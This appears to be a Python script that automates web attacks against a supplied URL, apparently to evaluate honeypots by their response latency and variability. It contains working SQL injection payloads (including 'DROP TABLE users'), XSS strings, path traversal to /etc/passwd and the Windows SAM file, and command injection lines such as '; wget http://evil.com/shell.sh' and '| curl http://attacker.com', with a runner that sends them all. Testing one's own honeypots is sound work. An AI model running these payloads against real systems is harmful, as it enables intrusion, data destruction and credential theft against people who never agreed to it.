# shared/automated_attacks.py
import requests
import json
import time
import random
from datetime import datetime
import sys
import os

def load_sqli_payloads():
    """Load SQL injection payloads from freephdlabor or use defaults"""
    try:
        payload_path = '../freephdlabor/SQL Injection/payloads.txt'
        if os.path.exists(payload_path):
            with open(payload_path, 'r', encoding='utf-8', errors='ignore') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                return payloads[:50]  # First 50
    except:
        pass
    
    # Fallback payloads
    return [
        "' OR '1'='1",
        "1' OR '1'='1'--",
        "' OR 1=1--",
        "admin' --",
        "' UNION SELECT NULL--",
        "1' UNION SELECT username, password FROM users--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' OR 'a'='a",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "1' AND SLEEP(5)--",
        "'; DROP TABLE users--",
        "1' WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "' OR '1'='1' /*",
        "1' UNION SELECT NULL,NULL,NULL,NULL--",
        "admin'--",
    ]

def load_xss_payloads():
    """Load XSS payloads"""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<iframe src=data:text/html,<script>alert('XSS')</script>>",
    ]

def load_traversal_payloads():
    """Load directory traversal payloads"""
    return [
        "../../etc/passwd",
        "../../../etc/passwd",
        "....//....//etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....\\....\\....\\windows\\system.ini",
        "..//..//..//etc//passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]

def load_command_injection_payloads():
    """Load command injection payloads"""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "; wget http://evil.com/shell.sh",
        "| curl http://attacker.com",
        "&& cat /etc/shadow",
        "; ping -c 10 127.0.0.1",
    ]

def send_attack(base_url, endpoint, payload, attack_type):
    """Send a single attack and record response"""
    url = f"{base_url}{endpoint}"
    
    try:
        start_time = time.time()
        
        if endpoint == '/api/login':
            # POST request
            response = requests.post(
                url,
                json={"username": payload, "password": "test123"},
                timeout=15
            )
        else:
            # GET request with query parameter
            response = requests.get(
                url,
                params={"q": payload},
                timeout=15
            )
        
        end_time = time.time()
        latency = int((end_time - start_time) * 1000)
        
        return {
            'success': True,
            'status_code': response.status_code,
            'latency_ms': latency,
            'response_length': len(response.text),
            'response_text': response.text,
            'attack_type': attack_type,
            'payload': payload[:100]
        }
    
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'attack_type': attack_type,
            'payload': payload[:100]
        }

def run_attack_suite(base_url, num_attacks=50, delay=0.5):
    """Run automated attack suite"""
    
    print(f"\n{'='*70}")
    print(f"AUTOMATED ATTACK TESTING")
    print(f"Target: {base_url}")
    print(f"Attacks: {num_attacks}")
    print(f"{'='*70}\n")
    
    # Load all payloads
    sqli_payloads = load_sqli_payloads()
    xss_payloads = load_xss_payloads()
    traversal_payloads = load_traversal_payloads()
    command_payloads = load_command_injection_payloads()
    
    # Build attack list
    all_attacks = (
        [(p, 'SQLi', '/api/search') for p in sqli_payloads[:20]] +
        [(p, 'XSS', '/api/search') for p in xss_payloads[:10]] +
        [(p, 'Traversal', '/api/search') for p in traversal_payloads[:8]] +
        [(p, 'CommandInjection', '/api/search') for p in command_payloads[:8]] +
        [('admin', 'AuthBrute', '/api/login') for _ in range(4)]
    )
    
    # Shuffle and limit
    random.shuffle(all_attacks)
    all_attacks = all_attacks[:num_attacks]
    
    results = []
    
    for i, (payload, attack_type, endpoint) in enumerate(all_attacks, 1):
        print(f"[{i}/{num_attacks}] {attack_type:20} ", end='', flush=True)
        
        result = send_attack(base_url, endpoint, payload, attack_type)
        results.append(result)
        
        if result['success']:
            print(f"✓ {result['status_code']} ({result['latency_ms']}ms)")
        else:
            print(f"✗ {result['error']}")
        
        time.sleep(delay)
    
    return results

def analyze_results(results, honeypot_name):
    """Analyze attack results"""
    
    print(f"\n{'='*70}")
    print(f"RESULTS ANALYSIS - {honeypot_name}")
    print(f"{'='*70}\n")
    
    successful = [r for r in results if r.get('success')]
    failed = [r for r in results if not r.get('success')]
    
    print(f"Total Attacks:        {len(results)}")
    print(f"Successful:           {len(successful)} ({len(successful)/len(results)*100:.1f}%)")
    print(f"Failed:               {len(failed)}")
    
    if successful:
        # Status codes
        from collections import Counter
        status_codes = Counter([r['status_code'] for r in successful])
        print(f"\nStatus Codes:")
        for code, count in status_codes.most_common():
            print(f"  {code}: {count}")
        
        # Latency stats
        latencies = [r['latency_ms'] for r in successful]
        print(f"\nLatency:")
        print(f"  Min:     {min(latencies)}ms")
        print(f"  Max:     {max(latencies)}ms")
        print(f"  Average: {sum(latencies)/len(latencies):.1f}ms")
        print(f"  Median:  {sorted(latencies)[len(latencies)//2]}ms")
        
        # Response variability
        response_lengths = [r['response_length'] for r in successful]
        unique_lengths = len(set(response_lengths))
        
        # Check actual text differences
        response_texts = [r['response_text'] for r in successful]
        unique_texts = len(set(response_texts))
        
        print(f"\nResponse Variability:")
        print(f"  Unique response lengths: {unique_lengths}/{len(successful)}")
        print(f"  Unique response texts:   {unique_texts}/{len(successful)}")
        print(f"  Variability score:       {unique_texts/len(successful)*100:.1f}%")
    
    print(f"\n{'='*70}\n")
    
    return {
        'total': len(results),
        'successful': len(successful),
        'success_rate': len(successful)/len(results)*100 if results else 0,
        'avg_latency': sum([r['latency_ms'] for r in successful])/len(successful) if successful else 0,
        'variability': len(set([r.get('response_text', '') for r in successful]))/len(successful)*100 if successful else 0
    }

if __name__ == '__main__':
    
    if len(sys.argv) < 2:
        print("Usage: python automated_attacks.py <honeypot_url> [num_attacks]")
        print("Example: python automated_attacks.py http://localhost:8080 50")
        sys.exit(1)
    
    base_url = sys.argv[1]
    num_attacks = int(sys.argv[2]) if len(sys.argv) > 2 else 50
    
    print(f"\nStarting automated attack testing at {datetime.now()}")
    
    results = run_attack_suite(base_url, num_attacks)
    stats = analyze_results(results, base_url)
    
    # Save results
    os.makedirs('attack_results', exist_ok=True)
    output_file = f"attack_results/attack_results_{int(time.time())}.json"
    with open(output_file, 'w') as f:
        json.dump({
            'target': base_url,
            'timestamp': datetime.now().isoformat(),
            'results': results,
            'stats': stats
        }, f, indent=2)
    
    print(f"Results saved to {output_file}")
    